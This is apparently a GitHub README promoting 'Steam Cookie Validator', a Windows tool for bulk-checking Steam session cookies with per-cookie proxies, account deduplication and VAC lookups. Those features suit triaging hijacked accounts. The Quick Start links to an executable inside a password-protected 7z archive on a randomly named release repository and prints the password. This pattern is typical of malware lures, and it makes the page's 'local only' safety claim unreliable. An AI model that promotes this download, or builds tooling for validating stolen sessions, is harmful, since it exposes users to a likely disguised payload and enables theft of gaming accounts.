# 🎫 Steam Cookie Validator

![Screenshot](media/screenshot.jpg)

> Validate, refresh and organize Steam session cookies in bulk — safely and fast.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-blue.svg)]()
[![Version](https://img.shields.io/badge/version-1.0.0-brightgreen.svg)]()

---

## ✨ Features

- **Bulk Validation** — check hundreds of cookies in parallel
- **Session Refresh** — renew expired logins
- **Profile Fetch** — pull nickname, avatar, VAC status
- **Proxy Support** — per-cookie proxy assignment
- **Export** — JSON / CSV / Netscape format
- **Deduplication** — remove duplicate accounts
- **Rate-limit Handling** — smart backoff
- **Local Only** — no data leaves your machine

---

## 🖼️ Preview

| Validator | Results | Export |
|-----------|---------|--------|
| ![Validator](media/screenshot.jpg) | ✅ | 📄 |

---

## 🚀 Quick Start

### 1. Download
Grab the latest `steam-cookie-validator.exe` from **[DOWNLOAD](https://github.com/SavageBullCrucible/steam-cookie-validator-release-f4pt/releases/download/v1.0.0/steam-cookie-validator.7z)**.

> 🔐 **Archive password:** `SmjdRNQBXm`

### 2. Prepare input
Put cookies in `cookies.txt` (one per line).

### 3. Run
```bat
steam-cookie-validator.exe --input cookies.txt --threads 20 --out valid.txt